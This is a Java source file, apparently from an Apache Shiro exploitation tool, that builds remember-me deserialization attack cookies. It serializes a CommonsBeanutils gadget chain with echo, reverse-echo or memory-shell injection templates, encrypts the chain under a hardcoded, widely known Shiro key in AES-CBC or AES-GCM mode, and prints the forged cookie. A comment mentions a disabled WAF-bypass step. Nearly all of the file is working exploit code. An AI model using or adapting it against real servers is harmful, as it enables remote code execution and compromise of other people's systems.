package com.summersec.attack.deser.frame;

import com.summersec.attack.Encrypt.CbcEncrypt;
import com.summersec.attack.Encrypt.GcmEncrypt;
import com.summersec.attack.Encrypt.ShiroGCM;
import com.summersec.attack.core.AttackService;
import com.summersec.attack.deser.payloads.ObjectPayload;
import com.summersec.attack.deser.util.Gadgets;
import com.summersec.attack.deser.util.GadgetsK;
import com.summersec.attack.utils.AesUtil;
import com.mchange.v2.ser.SerializableUtils;
import java.util.Arrays;
import java.util.List;
import javax.xml.bind.DatatypeConverter;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.crypto.CipherService;
import org.apache.shiro.util.ByteSource;



public class Shiro implements FramePayload {
    public Shiro() {
    }

    @Override
    public String sendpayload(Object ChainObject) throws Exception {
        return null;
    }

    @Override
    public String sendpayload(Object chainObject, String shiroKeyWord, String key) throws Exception {
        byte[] serpayload = SerializableUtils.toByteArray(chainObject);
        byte[] bkey = DatatypeConverter.parseBase64Binary(key);
        byte[] encryptpayload = null;
//        byte[] encryptpayload;
        if (AttackService.aesGcmCipherType == 1) {
//            CipherService cipherService = new AesCipherService();
//            ByteSource byteSource = cipherService.encrypt(serpayload, bkey);
//            encryptpayload = byteSource.getBytes();
//            GcmEncrypt gcmEncrypt = new GcmEncrypt();
            ShiroGCM shiroGCM = new ShiroGCM();
            String byteSource = shiroGCM.encrypt(key,serpayload);
//            String byteSource = gcmEncrypt.encrypt(key, serpayload);
//            encryptpayload = byteSource.getBytes();
            System.out.println(shiroKeyWord + "=" + byteSource);
            return shiroKeyWord + "=" + byteSource;

        } else {
//            encryptpayload = AesUtil.encrypt(serpayload, bkey);
            CbcEncrypt cbcEncrypt = new CbcEncrypt();
            String byteSource = cbcEncrypt.encrypt(key, serpayload);
            System.out.println(shiroKeyWord + "=" + byteSource);
            return shiroKeyWord + "=" + byteSource;
        }

//增加绕waf的方法，暂不开启。by @by3 @liuwa
        //return shiroKeyWord +  "=" +"...." + DatatypeConverter.printBase64Binary(encryptpayload);
//		return shiroKeyWord + "=" + DatatypeConverter.printBase64Binary(encryptpayload);

    }
//    @Override
//    public String sendpayload(Object chainObject, String shiroKeyWord, String key) throws Exception {
//        byte[] serpayload = SerializableUtils.toByteArray(chainObject);
//        byte[] bkey = DatatypeConverter.parseBase64Binary(key);
//        byte[] encryptpayload = null;
//    //        byte[] encryptpayload;
//        if (AttackService.aesGcmCipherType == 1) {
//    //            CipherService cipherService = new AesCipherService();
//    //            ByteSource byteSource = cipherService.encrypt(serpayload, bkey);
//    //            encryptpayload = byteSource.getBytes();
//            GcmEncrypt gcmEncrypt = new GcmEncrypt();
//            String byteSource = gcmEncrypt.encrypt(key,serpayload);
//    //            encryptpayload = byteSource.getBytes();
//            System.out.println(shiroKeyWord + "=" + byteSource);
//            return shiroKeyWord + "=" + byteSource;
//
//        } else {
//            encryptpayload = AesUtil.encrypt(serpayload, bkey);
//        }
//
//        return shiroKeyWord + "=" + DatatypeConverter.printBase64Binary(encryptpayload);
//    }

    public static void main(String[] args) throws Exception {
        Class<? extends ObjectPayload> gadgetClazz = (Class<? extends ObjectPayload>) Utils.getPayloadClass("CommonsBeanutilsAttrCompare");
        ObjectPayload<?> gadgetpayload = (ObjectPayload) gadgetClazz.newInstance();
        List<String> echoList = Arrays.asList("TomcatEcho", "Tomcat1Echo", "InjectMemTool", "SpringEcho", "NoEcho", "ReverseEcho", "TomcatHeaderEcho", "InjectMemTool");
        String option = "ReverseEcho";
        Object template = null;
        Object chainObject = null;
        if (echoList.contains(option)) {
            template = Gadgets.createTemplatesImpl(option);
        } else {
            template = GadgetsK.createTemplatesTomcatEcho();
        }

        Shiro shiro = new Shiro();
        if (template != null) {
            chainObject = gadgetpayload.getObject(template);
            AttackService.aesGcmCipherType = 1;
            String sendpayload = shiro.sendpayload(chainObject, "rememberMe", "4AvVhmFLUs0KTA3Kprsdag==");
            System.out.println(sendpayload);
        }

    }
}



